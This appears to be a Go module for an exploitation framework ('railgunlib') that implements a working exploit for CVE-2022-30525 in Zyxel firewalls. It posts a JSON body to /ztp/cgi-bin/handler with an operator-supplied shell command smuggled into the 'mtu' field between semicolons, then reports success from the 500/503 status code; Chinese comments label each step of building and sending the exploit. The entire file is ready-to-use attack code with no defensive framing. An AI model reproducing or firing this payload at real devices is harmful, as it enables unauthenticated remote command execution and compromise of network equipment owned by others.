package exp_zyxel

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2022_30525 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_30525) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()                                                                                                 //获取自定义Header
	headers.Set("Content-Type", "application/json")                                                                                     //设置漏洞所需Header
	payload := `{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";xcx;","data":"hi"}`          //原始exp
	payload = strings.Replace(payload, "xcx", cmd, 1)                                                                                   //构造exp
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/ztp/cgi-bin/handler"), payload, headers) //发送post请求
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 503 && httpresp.Resp.StatusCode != 500 { //检测响应状态码
		self.EchoSuccessMsg("执行失败！")
	} else {
		self.EchoSuccessMsg("执行成功，该漏洞无回显，请检查命令执行结果！") //该漏洞无回显故直接返回
	}

	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2022_30525{}, "exp_CVE_2022_30525.yml")

}
